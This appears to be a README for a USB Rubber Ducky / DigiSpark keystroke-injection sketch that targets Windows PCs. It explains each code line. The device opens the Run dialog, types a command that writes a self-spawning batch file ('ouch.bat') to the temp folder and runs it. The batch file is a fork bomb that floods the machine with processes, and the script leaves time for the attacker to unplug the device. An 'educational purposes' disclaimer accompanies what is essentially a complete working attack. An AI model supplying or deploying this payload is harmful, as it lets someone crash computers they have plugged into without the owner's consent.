# Ducky Script for Running a Payload

## Introduction
This code is a Ducky Script designed to execute a payload on a Windows computer using a USB Rubber Ducky or similar device. The script uses the DigiKeyboard library to automate keyboard input and run a series of commands. Please note that this script is intended for educational and research purposes and should be used responsibly and ethically.

## Code Explanation
The code provided is written in Arduino-like language and uses the DigiKeyboard library. Here's a brief explanation of what the code does:

- `#include "DigiKeyboard.h"`: This line includes the DigiKeyboard library, which is essential for controlling the USB Rubber Ducky or similar devices.

- `void setup()`: This is the setup function where you configure the initial settings. It sets pin 1 as an output, which is typically used to control an LED on Model A USB Rubber Ducky devices.

- `void loop()`: The loop function contains the main script that the USB Rubber Ducky will execute repeatedly.

  - `DigiKeyboard.update();`: This line ensures that the DigiKeyboard is ready to send keypresses.

  - `DigiKeyboard.sendKeyStroke(0);`: A null keypress is sent, ensuring that there are no lingering key modifiers from previous inputs.

  - `DigiKeyboard.delay(3000);`: A delay of 3 seconds is introduced.

  - `DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);`: This line sends a key combination (Win + R) to open the "Run" dialog.

  - `DigiKeyboard.delay(100);`: A small delay of 100 milliseconds follows.

  - `DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");`: This line types a command into the "Run" dialog to open a minimized command prompt window.

  - `DigiKeyboard.delay(500);`: A delay of 500 milliseconds is added.

  - `DigiKeyboard.println("(echo :ouch && echo start ouch.bat && echo goto ouch) > %temp%/ouch.bat");`: This command creates a payload in the temporary directory, named "ouch.bat."

  - `DigiKeyboard.delay(300);`: Another small delay.

  - `DigiKeyboard.println("cd %temp% && ouch.bat");`: This command navigates to the temporary directory and executes the "ouch.bat" payload.

  - `DigiKeyboard.delay(500);`: A delay of 500 milliseconds is included.

  - `digitalWrite(1, HIGH);`: This line turns on an LED if you're using a Model A USB Rubber Ducky.

  - `DigiKeyboard.delay(90000);`: The script waits for 90 seconds (this is the delay to give you time to unplug the device).

  - `digitalWrite(1, LOW);`: The LED is turned off.

  - `DigiKeyboard.delay(5000);`: A final delay of 5 seconds.

## Disclaimer
This code is for educational and research purposes only. Unauthorized or malicious use of such code or devices may be illegal and unethical. Ensure that you have the appropriate permissions and legal authorization before using this code. The author and contributors are not responsible for any misuse or illegal activities.

**USE AT YOUR OWN RISK**.
